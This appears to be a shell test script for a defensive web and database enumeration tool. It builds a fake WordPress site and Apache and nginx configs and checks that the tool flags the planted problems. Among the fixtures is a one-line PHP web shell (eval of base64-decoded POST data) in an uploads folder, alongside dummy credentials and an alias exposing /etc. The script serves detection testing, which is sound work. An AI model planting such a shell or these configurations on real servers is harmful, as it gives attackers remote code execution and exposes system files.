#!/bin/sh
# Tests for roles/applications/SV-01-web-db-enum.sh.
# Builds a fake site (WordPress marker, web shell in uploads, database dump,
# .env, .git, phpinfo page) and Apache and nginx config files pointing at it,
# then runs the web sections with --apache-conf / --nginx-conf so the result
# does not depend on what is installed.  The database sections are only
# checked for running cleanly, since they depend on the machine.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/applications/SV-01-web-db-enum.sh"
export CCDC_SKIP_VERIFY=1
# shellcheck disable=SC2086
run() { $SH "$C" "$@"; }
O="$T_TMP/out"; mkdir -p "$O"

t_start "options"
run --only nothing >/dev/null 2>&1; t_eq "$?" 2 "unknown section exits 2"
run --webroot "$T_TMP/no/such" >/dev/null 2>&1; t_eq "$?" 2 "missing --webroot folder exits 2"
run --apache-conf "$T_TMP/no.conf" >/dev/null 2>&1; t_eq "$?" 2 "missing --apache-conf file exits 2"
out=$(run --list 2>&1); t_has "$out" "datastores" "--list shows the sections"

# ---- the fake site ------------------------------------------------------------
S="$T_TMP/site"; P="$T_TMP/shop"
mkdir -p "$S/wp-includes" "$S/wp-content/uploads/2026" "$S/.git" "$P"
printf "<?php\n\$wp_version = '6.1.1';\n" >"$S/wp-includes/version.php"
printf "<?php\ndefine( 'DB_NAME', 'wpdb' );\ndefine( 'DB_USER', 'wpuser' );\ndefine( 'DB_PASSWORD', 'PlantedSecret987' );\ndefine( 'DB_HOST', 'localhost' );\n" >"$S/wp-config.php"
chmod 644 "$S/wp-config.php"
printf '<?php echo 1;\n' >"$S/index.php"
printf '<?php @eval(base64_decode($_POST["x"])); ?>\n' >"$S/wp-content/uploads/2026/logo.php"
printf '<?php phpinfo(); ?>\n' >"$S/test.php"
printf 'CREATE TABLE t (id int);\n' >"$S/site.sql"
printf 'ref: refs/heads/main\n' >"$S/.git/HEAD"
printf 'API_KEY=PlantedSecret987\n' >"$P/.env"
printf '<h1>shop</h1>\n' >"$P/index.html"
cat >"$T_TMP/apache.conf" <<CONF
Listen 9081
<VirtualHost *:9081>
    ServerName blog.test.local
    DocumentRoot "$S"
    <Directory "$S">
        Options Indexes FollowSymLinks
    </Directory>
    Alias /backup /etc
    ProxyPass /app http://127.0.0.1:8080/
    <Location /server-status>
        SetHandler server-status
    </Location>
</VirtualHost>
ServerTokens Prod
CONF
cat >"$T_TMP/nginx.conf" <<CONF
http {
    server_tokens off;
    server {
        listen 9443 ssl;
        server_name shop.test.local;
        root $P;
        location /dl/ {
            autoindex on;
        }
        location /api/ {
            proxy_pass http://127.0.0.1:5000;
        }
        location ~ \.php$ {
            fastcgi_pass unix:/run/php/php-fpm.sock;
        }
    }
}
CONF

t_start "web sections on the fake site"
out=$(run --out "$O" --batch --only sites,paths,webroots,apps --apache-conf "$T_TMP/apache.conf" --nginx-conf "$T_TMP/nginx.conf" 2>&1); rc=$?
t_eq "$rc" 0 "exit 0"
d=$(printf '%s\n' "$out" | sed -n 's/^All results: //p')
t_file "$d/summary.txt" "summary written"
sites=$(cat "$d/csv/sites.csv"); flags=$(cat "$d/csv/flags.csv"); apps=$(cat "$d/csv/apps.csv"); files=$(cat "$d/csv/files.csv")
t_has "$sites" "\"apache\",\"blog.test.local\",\"*:9081\",\"no\",\"$S\"" "Apache virtual host with its web root"
t_has "$sites" "\"nginx\",\"shop.test.local\",\"9443 ssl\",\"yes\",\"$P\"" "nginx server block with TLS"
t_has "$flags" "\"HIGH\",\"webroots\",\"$S/wp-content/uploads/2026/logo.php\",\"looks like a web shell" "web shell found by content"
t_has "$flags" "\"HIGH\",\"webroots\",\"$S/wp-content/uploads/2026/logo.php\",\"program file in an upload" "program file in uploads"
t_has "$flags" "\"HIGH\",\"webroots\",\"$S/site.sql\"" "database dump in the web root"
t_has "$flags" "\"HIGH\",\"webroots\",\"$P/.env\"" ".env in the web root"
t_has "$flags" "\"MED\",\"webroots\",\"$S/.git\"" ".git folder in the web root"
t_has "$flags" "\"MED\",\"webroots\",\"$S/test.php\",\"phpinfo" "phpinfo page"
t_has "$flags" "\"MED\",\"webroots\",\"$S/wp-config.php\",\"app config" "world-readable app config"
t_has "$flags" "Options Indexes) for $S" "Apache directory listing"
t_has "$flags" "autoindex) in server shop.test.local" "nginx directory listing"
t_hasnt "$flags" "ServerTokens" "ServerTokens Prod is not flagged"
t_hasnt "$flags" "server_tokens" "server_tokens off is not flagged"
t_has "$apps" "\"WordPress\",\"6.1.1\",\"$S\",\"$S/wp-config.php\",\"wpdb\",\"wpuser\",\"localhost\"" "WordPress version and database user"
t_has "$files" "\"webshell\",\"$S/wp-content/uploads/2026/logo.php\"" "files.csv lists the web shell"
# The password in wp-config.php and .env must never reach any output file.
if grep -r "PlantedSecret987" "$d" "$O"/*.log >/dev/null 2>&1; then t_eq "found" "absent" "no password in any output"; else t_eq "absent" "absent" "no password in any output"; fi

t_start "paths, layout, questions"
paths=$(cat "$d/csv/paths.csv")
t_has "$paths" "\"apache\",\"blog.test.local\",\"/\",\"$S\",\"web root\"" "web root as the / path"
t_has "$paths" "\"apache\",\"blog.test.local\",\"/app\",\"http://127.0.0.1:8080/\",\"proxy to an app\"" "Apache ProxyPass"
t_has "$paths" "\"nginx\",\"shop.test.local\",\"/api/\",\"http://127.0.0.1:5000\",\"proxy to an app\"" "nginx proxy_pass"
t_has "$paths" "\"PHP (FastCGI)\"" "nginx PHP handler"
t_has "$flags" "serves /etc to the web" "an alias to /etc is HIGH"
t_has "$flags" "server-status shows the server status" "open server-status reported"
t_has "$out" "/api/" "paths are listed on screen"
t_has "$out" "==========[ 2/4  paths:" "numbered section headers with a title"
t_has "$out" "[!] FIX" "flags shown live"
t_has "$d" "web-enum-" "numbered run folder"
for f in output.txt summary.txt paths.txt sites.txt flags.txt run.txt; do t_file "$d/$f" "$f written"; done
t_fail "output.txt has no colour codes" grep -q "$(printf '\033')" "$d/output.txt"
out=$(run --out "$O" --batch --only runtimes 2>&1)
t_has "$out" "runtimes: languages and app servers" "runtimes section runs"
if command -v script >/dev/null 2>&1; then
    # everything? n | sections: paths | content search? Enter | folders: Enter | databases? n
    printf 'n\npaths\n\n\nn\n' >"$T_TMP/ans"
    tt=$(CCDC_NO_TTY=0 script -qc "$SH '$C' --out '$O' --no-color --apache-conf '$T_TMP/apache.conf'" /dev/null <"$T_TMP/ans" 2>&1)
    t_has "$tt" "[y] yes, every section" "the first question lists its answers"
    t_has "$tt" "type: names separated by spaces" "the section question says what to type"
    t_has "$tt" "1/1  paths" "only the picked section ran"
    t_has "$tt" "Databases: not logged in" "'no' to databases is respected"
fi

t_start "--fast skips the content search"
out=$(run --out "$O" --batch --only webroots --fast --webroot "$S" 2>&1)
d=$(printf '%s\n' "$out" | sed -n 's/^All results: //p'); flags=$(cat "$d/csv/flags.csv")
t_hasnt "$flags" "looks like a web shell" "no content search"
t_has "$flags" "program file in an upload" "name-based checks still run"
t_has "$out" "fast: no web shell search" "summary says the search was skipped"

t_start "every section runs on this machine"
out=$(run --out "$O" --batch --webroot "$S" 2>&1); rc=$?
t_eq "$rc" 0 "full run exits 0"
t_has "$out" "datastores" "all sections listed in the summary"
t_done
